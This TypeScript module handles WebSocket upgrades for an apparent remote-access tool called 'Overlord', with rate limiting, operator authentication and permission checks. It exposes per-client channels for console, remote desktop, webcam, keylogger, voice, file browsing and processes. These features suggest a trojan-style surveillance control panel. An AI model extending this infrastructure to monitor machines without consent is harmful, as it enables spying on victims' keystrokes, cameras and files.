import { authenticateRequest, extractTokenFromRequest } from "../../auth";
import { hashTokenForSession } from "../../db";
import { logger } from "../../logger";
import { isIpBanned } from "../../db";
import type { FeatureName, UserRole } from "../../users";
import { hasPermission, requireClientAccess, requireFeatureAccess } from "../../rbac";
import type { SocketRole } from "../../sessions/types";

type RequestServer = {
  requestIP: (req: Request) => { address?: string } | null | undefined;
  upgrade: (req: Request, data: any) => boolean;
};

type WsUpgradeDeps = {
  isAuthorizedAgentRequest: (req: Request, url: URL) => boolean;
};

function positiveIntEnv(name: string, fallback: number): number {
  const raw = String(process.env[name] || "").trim();
  if (!raw) return fallback;
  const parsed = Number(raw);
  if (!Number.isFinite(parsed) || parsed <= 0) return fallback;
  return Math.floor(parsed);
}

const WS_RATE_WINDOW_MS = positiveIntEnv("OVERLORD_WS_UPGRADE_RATE_WINDOW_MS", 10_000);
const WS_RATE_MAX = positiveIntEnv("OVERLORD_WS_UPGRADE_RATE_MAX", 30);
const wsRateMap = new Map<string, { count: number; windowStart: number }>();

setInterval(() => {
  const now = Date.now();
  for (const [ip, entry] of wsRateMap.entries()) {
    if (now - entry.windowStart > WS_RATE_WINDOW_MS * 2) {
      wsRateMap.delete(ip);
    }
  }
}, 30_000);

function isWsRateLimited(ip: string): boolean {
  if (!ip) return false;
  const now = Date.now();
  const entry = wsRateMap.get(ip);
  if (!entry || now - entry.windowStart > WS_RATE_WINDOW_MS) {
    wsRateMap.set(ip, { count: 1, windowStart: now });
    return false;
  }
  entry.count++;
  if (entry.count > WS_RATE_MAX) {
    logger.warn(`[rate-limit] WebSocket upgrade rate limit exceeded for IP ${ip}`);
    return true;
  }
  return false;
}

function checkOperatorAccess(
  user: { userId: number; role: string },
  clientId: string,
  feature: FeatureName,
): Response | null {
  try {
    requireClientAccess(user as any, clientId);
    requireFeatureAccess(user as any, feature);
  } catch (error) {
    if (error instanceof Response) return error;
    return new Response("Forbidden", { status: 403 });
  }
  return null;
}

type AuthenticatedUser = {
  userId: number;
  username: string;
  role: UserRole;
};

type ClientViewerUpgradeRoute = {
  pattern: RegExp;
  role: SocketRole;
  feature: FeatureName;
  sessionId?: () => string;
};

const clientViewerUpgradeRoutes: ClientViewerUpgradeRoute[] = [
  {
    pattern: /^\/api\/clients\/(.+)\/console\/ws$/,
    role: "console_viewer",
    feature: "console",
    sessionId: () => crypto.randomUUID(),
  },
  {
    pattern: /^\/api\/clients\/(.+)\/rd\/ws$/,
    role: "rd_viewer",
    feature: "remote_desktop",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/backstage\/ws$/,
    role: "backstage_viewer",
    feature: "backstage",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/webcam\/ws$/,
    role: "webcam_viewer",
    feature: "webcam",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/files\/ws$/,
    role: "file_browser_viewer",
    feature: "file_browser",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/processes\/ws$/,
    role: "process_viewer",
    feature: "processes",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/keylogger\/ws$/,
    role: "keylogger_viewer",
    feature: "keylogger",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/voice\/ws$/,
    role: "voice_viewer",
    feature: "voice",
  },
  {
    pattern: /^\/api\/clients\/(.+)\/desktop-audio\/ws$/,
    role: "desktop_audio_viewer",
    feature: "voice",
  },
];

type GlobalViewerUpgradeRoute = {
  path: string;
  role: SocketRole;
  authorize?: (user: AuthenticatedUser) => Response | null;
};

const globalViewerUpgradeRoutes: GlobalViewerUpgradeRoute[] = [
  { path: "/api/notifications/ws", role: "notifications_viewer" },
  { path: "/api/dashboard/ws", role: "dashboard_viewer" },
  {
    path: "/api/chat/ws",
    role: "chat_viewer",
    authorize: (user) =>
      hasPermission(user.role, "chat:write", user.userId)
        ? null
        : new Response("Forbidden: Chat access denied", { status: 403 }),
  },
];

function getRequestIp(req: Request, server: RequestServer): string {
  return server.requestIP(req)?.address || "";
}

function upgradeOrFail(
  req: Request,
  server: RequestServer,
  data: Record<string, unknown>,
): Response {
  if (server.upgrade(req, { data })) {
    return new Response();
  }
  return new Response("Upgrade failed", { status: 500 });
}

async function authenticateViewerRequest(req: Request): Promise<AuthenticatedUser | Response> {
  const user = await authenticateRequest(req);
  if (!user) {
    return new Response("Unauthorized", { status: 401 });
  }
  return user;
}

async function tryClientViewerUpgrade(
  req: Request,
  url: URL,
  server: RequestServer,
): Promise<Response | null> {
  for (const route of clientViewerUpgradeRoutes) {
    const match = url.pathname.match(route.pattern);
    if (!match) continue;

    const user = await authenticateViewerRequest(req);
    if (user instanceof Response) return user;

    if (user.role === "viewer") {
      return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
    }

    const clientId = match[1];
    const denied = checkOperatorAccess(user, clientId, route.feature);
    if (denied) return denied;

    const data: Record<string, unknown> = {
      role: route.role,
      clientId,
      ip: getRequestIp(req, server),
      userRole: user.role,
      userId: user.userId,
      username: user.username,
    };
    const token = extractTokenFromRequest(req);
    if (token) data.authTokenHash = hashTokenForSession(token);
    if (route.sessionId) {
      data.sessionId = route.sessionId();
    }
    return upgradeOrFail(req, server, data);
  }

  return null;
}

async function tryGlobalViewerUpgrade(
  req: Request,
  url: URL,
  server: RequestServer,
): Promise<Response | null> {
  if (req.method !== "GET") return null;

  const route = globalViewerUpgradeRoutes.find((candidate) => candidate.path === url.pathname);
  if (!route) return null;

  const user = await authenticateViewerRequest(req);
  if (user instanceof Response) return user;

  const denied = route.authorize?.(user);
  if (denied) return denied;

  return upgradeOrFail(req, server, {
    role: route.role,
    clientId: "",
    ip: getRequestIp(req, server),
    userRole: user.role,
    userId: user.userId,
    username: user.username,
  });
}

export async function handleWsUpgradeRoutes(
  req: Request,
  url: URL,
  server: RequestServer,
  deps: WsUpgradeDeps,
): Promise<Response | null> {
  const ip = getRequestIp(req, server);
  if (isWsRateLimited(ip)) {
    return new Response("Too Many Requests", { status: 429 });
  }

  const wsMatch = url.pathname.match(/^\/api\/clients\/(.+)\/stream\/ws$/);
  if (wsMatch) {
    if (!deps.isAuthorizedAgentRequest(req, url)) {
      return new Response("Unauthorized", { status: 401 });
    }
    const clientId = wsMatch[1];
    const role = "client";
    if (ip && isIpBanned(ip)) {
      logger.warn(`[auth] Rejected banned IP ${ip} for client ${clientId}`);
      return new Response("Forbidden", { status: 403 });
    }
    return upgradeOrFail(req, server, { role, clientId, ip });
  }

  const clientViewerResponse = await tryClientViewerUpgrade(req, url, server);
  if (clientViewerResponse) return clientViewerResponse;

  const globalViewerResponse = await tryGlobalViewerUpgrade(req, url, server);
  if (globalViewerResponse) return globalViewerResponse;

  return null;
}
